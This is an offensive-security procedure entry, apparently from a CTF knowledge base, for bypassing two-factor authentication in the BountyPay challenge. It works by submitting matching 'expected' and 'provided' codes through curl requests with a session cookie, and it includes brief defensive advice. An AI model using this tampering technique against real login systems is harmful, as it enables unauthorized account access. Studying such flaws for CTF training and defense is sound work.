---
id: proc-2fa-bypass-comparison
tags:
  - 2fa-bypass
  - authentication
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-2fa-bypass]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:32:58.117Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Bypass-2FA-by-Controlling-Comparison-Values

## Summary

This procedure exploits a flawed 2FA verification where the attacker controls both sides of the comparison, allowing trivial bypass of authentication without valid codes.

## Description

In the BountyPay CTF, the 2FA process compares user-input codes against server-generated values, but poor implementation allows manipulation of both via request interception. This leads to unauthorized access, chaining into further exploits like account takeover. Prerequisites include a proxy tool for request tampering and a semi-valid session.

## Requirements

1. Proxy like Burp Suite for intercepting requests
2. Valid initial login session
3. Knowledge of the 2FA endpoint parameters

## Defense

Defensive measures and detection strategies:

- Implement server-side only comparisons for 2FA
- Use rate limiting on auth endpoints
- Log and monitor anomalous comparison values

## Objectives

1. Bypass 2FA without codes
2. Gain access to protected user areas
3. Enable chaining to API exploitation

## Instructions

### Step 1: Intercept 2FA Request

**Context**: Capture the verification request to identify comparison parameters.

**Command** ([[commands/curl-2fa-bypass]]):
```bash
curl -X POST 'https://bountypay.h1ctf.com/2fa-verify' -d 'expected=123456&provided=123456' -b 'session=VALID_SESSION'
```

> This sets both values to match, bypassing the check. Expected output: {"status":"success"}.

### Step 2: Submit and Verify Access

**Context**: Confirm bypass by accessing post-2FA resources.

**Command** ([[commands/curl-2fa-bypass]]):
```bash
curl 'https://bountypay.h1ctf.com/dashboard' -b 'session=VALID_SESSION'
```

> Response shows dashboard content if successful.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-2fa-bypass]]

## Tools Used

- None specific

## Tags

- [[2fa-bypass]]
- [[authentication]]
